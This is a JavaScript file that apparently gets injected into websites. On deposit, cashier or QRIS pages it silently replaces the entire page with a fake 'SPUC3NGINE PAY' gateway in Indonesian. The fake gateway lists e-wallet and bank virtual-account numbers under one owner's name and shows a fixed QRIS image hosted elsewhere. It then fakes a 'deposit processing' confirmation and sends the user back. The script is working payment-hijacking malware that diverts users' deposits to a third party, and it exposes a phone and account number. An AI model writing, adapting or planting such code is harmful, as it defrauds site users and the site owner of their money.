(function () {
  const url = window.location.href;
  const match = [
    '/deposit',
    '/bank',
    '/deposit.php',
    '/qris.php',
    '/cashier',
    '/?page=transaksi',
    '/index.php?page=transaksi',
    '/?deposit&head=home',
    '/index.php?page=cashier',
    '/bank.php'
  ];

  if (!match.some(path => url.includes(path))) return;

  document.documentElement.innerHTML = "<head></head><body></body>";

  document.head.innerHTML = `
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>SPUC3NGINE PAY - Premium Gateway</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Rajdhani:wght@500;600;700&display=swap" rel="stylesheet">
    <style>
      :root {
        --bg-main: #03050d;
        --bg-card: rgba(10, 15, 30, 0.8);
        --primary: #00f0ff;
        --secondary: #bd00ff;
        --success: #00ffcc;
        --text: #f1f5f9;
        --border: rgba(0, 240, 255, 0.25);
        --glow: 0 0 15px rgba(0, 240, 255, 0.4);
      }

      body {
        margin: 0;
        font-family: 'Rajdhani', sans-serif;
        background: radial-gradient(circle at 50% 50%, #0d122b 0%, var(--bg-main) 100%);
        color: var(--text);
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        padding: 20px 0;
        box-sizing: border-box;
        overflow-x: hidden;
      }

      /* Animated Background Cyber Elements */
      body::before {
        content: "";
        position: fixed;
        top: 0; left: 0; width: 100%; height: 100%;
        background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
        background-size: 100% 4px, 6px 100%;
        z-index: 0;
        pointer-events: none;
      }

      .container {
        max-width: 460px;
        width: 92%;
        background: var(--bg-card);
        backdrop-filter: blur(20px);
        -webkit-backdrop-filter: blur(20px);
        border-radius: 28px;
        border: 1px solid var(--border);
        box-shadow: 0 0 50px rgba(0, 240, 255, 0.15), inset 0 0 30px rgba(189, 0, 255, 0.1);
        padding: 35px 28px;
        display: flex;
        flex-direction: column;
        align-items: center;
        position: relative;
        z-index: 1;
        animation: cyberEntrance 0.7s cubic-bezier(0.16, 1, 0.3, 1);
      }

      @keyframes cyberEntrance {
        from { opacity: 0; transform: scale(0.95) translateY(30px); filter: blur(5px); }
        to { opacity: 1; transform: scale(1) translateY(0); filter: blur(0); }
      }

      .logo-area {
        font-family: 'Orbitron', sans-serif;
        font-size: 28px;
        font-weight: 900;
        text-align: center;
        letter-spacing: 3px;
        background: linear-gradient(90deg, var(--primary), #fff, var(--secondary));
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        filter: drop-shadow(0 0 12px rgba(0, 240, 255, 0.5));
        margin-bottom: 2px;
        animation: pulseGlow 3s ease-in-out infinite;
      }

      @keyframes pulseGlow {
        0%, 100% { filter: drop-shadow(0 0 12px rgba(0, 240, 255, 0.4)); }
        50% { filter: drop-shadow(0 0 20px rgba(189, 0, 255, 0.6)); }
      }

      .subtitle {
        font-size: 13px;
        color: #94a3b8;
        letter-spacing: 6px;
        text-transform: uppercase;
        margin-bottom: 24px;
        font-weight: 700;
        position: relative;
      }

      .subtitle::after {
        content: ""; position: absolute; bottom: -6px; left: 25%; width: 50%; height: 1px; background: linear-gradient(90deg, transparent, var(--primary), transparent);
      }

      .marquee {
        width: 100%;
        overflow: hidden;
        white-space: nowrap;
        background: rgba(251, 191, 36, 0.04);
        border: 1px solid rgba(251, 191, 36, 0.2);
        border-radius: 10px;
        padding: 10px;
        color: #fbbf24;
        margin-bottom: 24px;
        font-size: 13px;
        box-sizing: border-box;
        font-weight: 600;
      }

      .marquee span {
        display: inline-block;
        padding-left: 100%;
        animation: marquee 22s linear infinite;
      }

      @keyframes marquee {
        0% { transform: translateX(0%); }
        100% { transform: translateX(-100%); }
      }

      .actions {
        display: grid;
        grid-template-columns: 1fr 1fr;
        gap: 12px;
        width: 100%;
        margin-bottom: 24px;
      }

      button {
        width: 100%;
        background: linear-gradient(135deg, #0096c7, var(--primary));
        color: #03050d;
        border: 1px solid rgba(0, 240, 255, 0.3);
        padding: 14px 18px;
        border-radius: 14px;
        font-family: 'Rajdhani', sans-serif;
        font-size: 16px;
        font-weight: 700;
        text-transform: uppercase;
        cursor: pointer;
        transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
        box-shadow: var(--glow);
        letter-spacing: 1px;
      }

      button:hover {
        transform: translateY(-3px);
        box-shadow: 0 0 25px rgba(0, 240, 255, 0.6);
        background: linear-gradient(135deg, var(--primary), #e0f7fa);
      }

      button.secondary {
        background: linear-gradient(135deg, var(--secondary), #7b2cbf);
        color: #fff;
        border: 1px solid rgba(189, 0, 255, 0.3);
        box-shadow: 0 0 15px rgba(189, 0, 255, 0.3);
      }
      button.secondary:hover {
        box-shadow: 0 0 25px rgba(189, 0, 255, 0.6);
        background: linear-gradient(135deg, #d857ff, var(--secondary));
      }

      button.help {
        grid-column: span 2;
        background: rgba(255, 255, 255, 0.03) !important;
        border: 1px dashed rgba(255, 255, 255, 0.15) !important;
        color: #94a3b8 !important;
        box-shadow: none !important;
        margin-top: 4px;
      }
      button.help:hover {
        background: rgba(255, 255, 255, 0.07) !important;
        color: #fff !important;
        border-style: solid !important;
        border-color: rgba(255,255,255,0.4) !important;
      }

      select, input {
        width: 100%;
        padding: 14px 18px;
        border: 1px solid var(--border);
        border-radius: 14px;
        font-size: 16px;
        background: #060919;
        color: #fff;
        font-family: 'Rajdhani', sans-serif;
        font-weight: 600;
        box-sizing: border-box;
        transition: all 0.3s ease;
        margin-bottom: 14px;
      }

      select:focus, input:focus {
        outline: none;
        border-color: var(--primary);
        box-shadow: 0 0 15px rgba(0, 240, 255, 0.3);
        background: #0a0e26;
      }

      .content-panel {
        width: 100%;
        animation: panelSlide 0.4s cubic-bezier(0.16, 1, 0.3, 1);
      }

      @keyframes panelSlide {
        from { opacity: 0; transform: translateY(15px); filter: blur(2px); }
        to { opacity: 1; transform: translateY(0); filter: blur(0); }
      }

      .bank-info {
        background: rgba(5, 8, 22, 0.7);
        padding: 20px;
        border-radius: 18px;
        border: 1px solid rgba(189, 0, 255, 0.2);
        display: flex;
        flex-direction: column;
        gap: 14px;
        margin-bottom: 14px;
      }

      .bank-header {
        display: flex;
        align-items: center;
        gap: 16px;
      }

      .bank-info img {
        width: 48px;
        height: 48px;
        object-fit: contain;
        background: #fff;
        padding: 6px;
        border-radius: 10px;
        box-shadow: 0 4px 12px rgba(0,0,0,0.3);
      }

      .bank-meta b { font-size: 20px; color: var(--primary); font-family: 'Orbitron', sans-serif; }
      .bank-meta small { color: #64748b; font-size: 14px; display: block; margin-top: 2px; font-weight: 600; }

      .bank-number {
        display: flex;
        align-items: center;
        justify-content: space-between;
        background: #02040a;
        padding: 12px 16px;
        border-radius: 12px;
        border: 1px solid rgba(255,255,255,0.03);
      }

      .bank-number span {
        font-family: 'Orbitron', sans-serif;
        font-size: 16px;
        letter-spacing: 1.5px;
        color: #fff;
        text-shadow: 0 0 5px rgba(255,255,255,0.2);
      }

      .copy-btn {
        width: auto;
        padding: 8px 16px;
        font-size: 13px;
        border-radius: 8px;
        box-shadow: none;
      }

      .result-area {
        text-align: center;
        margin-top: 18px;
      }

      .qr-card {
        background: #fff;
        padding: 16px;
        border-radius: 20px;
        display: inline-block;
        box-shadow: 0 15px 40px rgba(0,0,0,0.6), 0 0 20px rgba(0, 240, 255, 0.2);
      }
      .qr-card img { width: 210px; height: 210px; display: block; }

      .qr-buttons {
        display: flex;
        gap: 12px;
        margin-top: 18px;
        width: 100%;
      }
      
      .done-btn {
        background: linear-gradient(135deg, var(--success), #00b494);
        color: #03050d;
        box-shadow: 0 4px 15px rgba(0, 255, 204, 0.2);
      }
      .done-btn:hover { box-shadow: 0 0 25px rgba(0, 255, 204, 0.5); }

      .spinner {
        width: 44px;
        height: 44px;
        border: 3px solid rgba(0, 240, 255, 0.05);
        border-top: 3px solid var(--primary);
        border-radius: 50%;
        animation: spin 0.7s linear infinite;
        margin: 25px auto;
      }
      @keyframes spin { to { transform: rotate(360deg); } }

      .footer-img {
        margin-top: 28px;
        text-align: center;
        opacity: 0.3;
        transition: opacity 0.3s;
      }
      .footer-img:hover { opacity: 0.6; }
      .footer-img img { max-width: 55%; filter: grayscale(100%) brightness(200%); }

      .toast {
        position: fixed;
        bottom: 35px;
        left: 50%;
        transform: translateX(-50%) scale(0.85);
        min-width: 265px;
        text-align: center;
        padding: 14px 22px;
        border-radius: 14px;
        font-size: 15px;
        font-weight: 700;
        opacity: 0;
        pointer-events: none;
        transition: all 0.35s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        z-index: 9999;
        font-family: 'Rajdhani', sans-serif;
        text-transform: uppercase;
        letter-spacing: 0.5px;
      }
      .toast.show { opacity: 1; transform: translateX(-50%) scale(1); }
      .toast.success { background: var(--success); color: #03050d; box-shadow: 0 0 20px rgba(0,255,204,0.4); }
      .toast.error { background: #ff0055; color: #fff; box-shadow: 0 0 20px rgba(255,0,85,0.4); }
    </style>
  `;

  document.body.innerHTML = `
    <div class="container">
      <div class="logo-area">SPUC3NGINE PAY</div>
      <div class="subtitle">Secure Gateway v2</div>
      
      <div class="marquee">
        <span>⚠️ Deposit WAJIB sesuai nominal formulir! Transaksi pertama DIWAJIBKAN menggunakan Kode Unik (Contoh: 50.123). Jika melanggar syarat ketentuan, otomatis GAGAL PROSES.</span>
      </div>

      <div class="actions">
        <button onclick="showDeposit('manual')">Manual Deposit</button>
        <button class="secondary" onclick="showDeposit('auto')">Instant QRIS</button>
        <button class="help" onclick="openHelp()">💬 Hubungi Bantuan Deposit</button>
      </div>

      <div id="manual-step" class="content-panel" style="display:none;">
        <select onchange="selectMethod(this.value)">
          <option value="" selected disabled>-- PILIH METODE DEPOSIT --</option>
          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRgpSc_j6RrvzR4yXB3aJvMKum3-dbfqVJVwo_xCgZmnA&s=10","name":"Dana","number":"085179820753","owner":"PUR**A ISM**L"}'>Dana</option>
          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSgL5miB0Nl0N4uXXxjG1DZtuV-0kgZ9Hlm_KvhVZ5cgA&s=10","name":"Ovo","number":"SCAN QRIS","owner":"SCAN QRIS"}'>Ovo</option>
          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSwXMKiiND-3i_R9jwcg3-gXBrxNEOGL3DEog&usqp=CAU","name":"BRI VA","number":"8881085179820753","owner":"PUR**A ISM**L"}'>BRI VA</option>
          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQaeDt-esFy5TIN8gKVJhbFowRkxIDEep48aA&usqp=CAU","name":"BCA VA","number":"3935085179820753","owner":"PUR**A ISM**L"}'>BCA VA</option>
          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTt83cjvCmZBfU4uD-KIMRZFZIG5tbxEO25eg&usqp=CAU","name":"BNI VA","number":"8810085179820753","owner":"PUR**A ISM**L"}'>BNI VA</option>
          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQhHhAzPQYSQHan0-EHud0djSuTjQzstRV9zA&usqp=CAU","name":"MANDIRI VA","number":"60001085179820753","owner":"PUR**A ISM**L"}'>MANDIRI VA</option>
        </select>
        
        <div id="manual-details" class="bank-info" style="display:none">
          <div class="bank-header">
            <img id="bank-logo" src="" alt="Bank Logo">
            <div class="bank-meta">
              <b id="bank-name"></b>
              <small id="bank-owner"></small>
            </div>
          </div>
          <div class="bank-number">
            <span id="bank-number"></span>
            <button class="copy-btn" onclick="copyNumber()">Salin</button>
          </div>
          <input id="manual-nominal" type="text" placeholder="Nominal (Min. 50.000)" oninput="formatRupiahEvent(this)">
          <button onclick="submitManualDeposit()">Kirim Konfirmasi</button>
          <div id="manual-result"></div>
        </div>
      </div>

      <div id="auto-deposit" class="content-panel" style="display:none;">
        <input id="nominal" type="text" placeholder="Nominal (Min. 50.000)" oninput="formatRupiahEvent(this)">
        <button class="secondary" onclick="generateQRIS()">Buat QRIS Sekarang</button>
        <div id="auto-result" class="result-area"></div>
      </div>

      <div class="footer-img">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSxt4SV-4Fwz_SHmJwW_ENA4zghNfwbYgAG4x_l9IbA0w&s=10" alt="Secure Payment Gate">
      </div>
    </div>
    <div id="toast" class="toast"></div>
  `;

  // --- FUNGSI BARU: FORMAT RUPIAH OTOMATIS SAAT DIKETIK ---
  window.formatRupiahEvent = function (element) {
    let value = element.value.replace(/[^0-9]/g, ""); // Hanya ambil angka
    if (value === "") {
      element.value = "";
      return;
    }
    // Tambahkan titik setiap kelipatan 3 digit dari belakang
    element.value = Number(value).toLocaleString("id-ID");
  };

  // Mengubah kembali string format titik menjadi angka murni untuk pengecekan validasi
  function getCleanNumber(str) {
    return Number(str.replace(/\./g, "") || 0);
  }

  function showToast(msg, type = "success") {
    const toast = document.getElementById("toast");
    toast.textContent = msg;
    toast.className = `toast ${type} show`;
    setTimeout(() => toast.classList.remove("show"), 2500);
  }

  window.showDeposit = function (type) {
    const manualPanel = document.getElementById("manual-step");
    const autoPanel = document.getElementById("auto-deposit");
    
    manualPanel.style.display = type === "manual" ? "block" : "none";
    autoPanel.style.display = type === "auto" ? "block" : "none";
  };

  window.selectMethod = function (j) {
    if (!j) return;
    const m = JSON.parse(j);
    const details = document.getElementById("manual-details");
    details.style.display = "flex";
    document.getElementById("bank-logo").src = m.logo;
    document.getElementById("bank-name").innerText = m.name;
    document.getElementById("bank-number").innerText = m.number;
    document.getElementById("bank-owner").innerText = "A/N: " + m.owner;
  };

  window.copyNumber = function () {
    const num = document.getElementById("bank-number").innerText;
    if (!num) return showToast("Nomor kosong!", "error");
    navigator.clipboard.writeText(num).then(() => showToast("⚡ Rekening Berhasil Disalin", "success"));
  };

  window.submitManualDeposit = function () {
    const rawVal = document.getElementById("manual-nominal").value;
    const n = getCleanNumber(rawVal); // Bersihkan titik sebelum validasi angka
    
    if (n < 50000) return showToast("Minimal deposit Rp 50.000", "error");
    document.getElementById("manual-result").innerHTML = '<div class="spinner"></div>';
    setTimeout(() => {
      document.getElementById("manual-result").innerHTML = "<div style='color:var(--success); font-weight:700; margin-top:12px; font-size:16px;'>✓ DEPOSIT SEDANG DIPROSES SYSTEM</div>";
      setTimeout(() => history.back(), 1500);
    }, 1500);
  };

  window.generateQRIS = function () {
    const rawVal = document.getElementById("nominal").value;
    const n = getCleanNumber(rawVal); // Bersihkan titik sebelum validasi angka
    
    if (n < 50000) return showToast("Minimal Rp 50.000", "error");
    document.getElementById("auto-result").innerHTML = '<div class="spinner"></div>';

    const qrUrl = "https://s13.gifyu.com/images/bdwy1.jpg";

    setTimeout(() => {
      document.getElementById("auto-result").innerHTML = `
        <div class="qr-card" style="animation: panelSlide 0.4s ease;">
          <img id="qris-img" src="${qrUrl}" alt="QRIS">
        </div>
        <div class="qr-buttons">
          <button style="background:#3b82f6; color:#fff; border-color: rgba(59,130,246,0.5); box-shadow:0 0 15px rgba(59,130,246,0.3)" onclick="downloadQRIS()">Unduh QRIS</button>
          <button class="done-btn" onclick="history.back()">Saya Sudah Bayar</button>
        </div>
      `;
    }, 1000);
  };

  window.downloadQRIS = function () {
    const qrUrl = "https://s13.gifyu.com/images/bdwy1.jpg";
    const link = document.createElement("a");
    link.href = qrUrl;
    link.download = "spuc3ngine-qris.png";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    showToast("✓ QRIS Berhasil Diunduh", "success");
  };

  window.openHelp = function () {
    window.open("https://direct.lc.chat/19752556/", "_blank");
  };
})();
